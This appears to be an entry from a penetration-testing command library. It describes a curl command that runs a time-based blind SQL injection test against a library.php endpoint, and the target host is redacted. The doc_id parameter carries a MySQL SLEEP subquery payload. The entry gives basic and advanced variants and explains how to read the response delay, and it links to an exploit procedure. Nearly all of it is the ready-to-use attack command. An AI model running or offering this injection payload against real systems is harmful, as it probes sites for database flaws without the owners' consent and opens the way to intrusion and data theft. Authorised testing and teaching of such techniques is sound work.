---
data: >-
  curl -X GET "https://████/library.php?path=test&doc_id=1 AND (SELECT * FROM
  (SELECT(SLEEP(1)))WUeh)" --max-time 30 -w "%{time_total}\n" -s -o /dev/null
tags:
  - blind-sqli
  - time-based
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.222Z'
id: d6c6ea82-e5d2-478c-98cb-da8471b8ed80
verified: false
validated: true
submitted: true
---
# blind-sqli-time-based-sleep-test

## Command

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 AND (SELECT * FROM (SELECT(SLEEP(1)))WUeh)" --max-time 30 -w "%{time_total}\n" -s -o /dev/null
```

## Description

Executes a time-based blind SQLi test using MySQL SLEEP(1) in a subquery to cause a delay if injected successfully.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| doc_id payload | SQL injection string with SLEEP | Yes |
| --max-time | Timeout in seconds | Yes |
| -w | Write total time to stdout | Yes |
| -s -o /dev/null | Silent output, discard body | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 AND (SELECT * FROM (SELECT(SLEEP(1)))WUeh)" --max-time 30 -w "%{time_total}\n" -s -o /dev/null
```

### Advanced Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))WUeh)" --max-time 60 -w "%{time_total}\n" -s -o /dev/null
```

## Expected Output

A numeric value representing total response time, e.g., 5.123 for ~5-second delay.

## Related

- [[procedures/Exploit-Time-Based-Blind-SQL-Injection-with-SLEEP]]
